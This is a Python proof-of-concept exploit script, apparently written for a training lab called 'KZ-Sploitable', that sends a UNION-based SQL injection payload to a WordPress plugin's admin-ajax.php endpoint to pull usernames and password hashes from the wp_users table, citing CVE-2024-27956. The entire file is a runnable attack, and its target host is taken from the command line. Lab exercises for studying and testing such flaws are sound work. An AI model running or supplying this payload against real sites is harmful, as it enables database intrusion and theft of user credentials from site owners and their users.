#!/usr/bin/env python3
"""WordPress Plugin SQL Injection PoC (CVE-2024-27956)

Demonstrates SQL injection through a vulnerable WordPress plugin endpoint.
This is an educational proof-of-concept for the KZ-Sploitable lab environment.
"""

import sys
import urllib.request
import urllib.parse
import json


def main():
    target = sys.argv[1] if len(sys.argv) > 1 else "http://kz-wordpress:80"
    print(f"[*] Target: {target}")
    print(f"[*] CVE: CVE-2024-27956")
    print(f"[*] Type: SQL Injection via plugin endpoint")
    print()

    payload = "' UNION SELECT user_login,user_pass,3 FROM wp_users-- -"
    encoded = urllib.parse.quote(payload)
    url = f"{target}/wp-admin/admin-ajax.php?action=vulnerable_action&id={encoded}"

    print(f"[+] Sending SQLi payload...")
    print(f"[+] URL: {url}")
    print()

    try:
        req = urllib.request.Request(url, method="GET")
        req.add_header("User-Agent", "KZ-Sploitable-PoC/1.0")
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            print(f"[+] Response status: {resp.status}")
            print(f"[+] Response body (first 500 chars):")
            print(body[:500])
            print()
            print("[+] SUCCESS: Endpoint responded -- check output for leaked data")
    except urllib.error.HTTPError as e:
        print(f"[!] HTTP Error {e.code}: {e.reason}")
        print(f"[*] This may indicate the plugin is not vulnerable (patched profile)")
    except urllib.error.URLError as e:
        print(f"[!] Connection failed: {e.reason}")
        print(f"[*] Ensure the WordPress container is running")
    except Exception as e:
        print(f"[!] Error: {e}")

    print()
    print("[*] PoC execution complete")


if __name__ == "__main__":
    main()
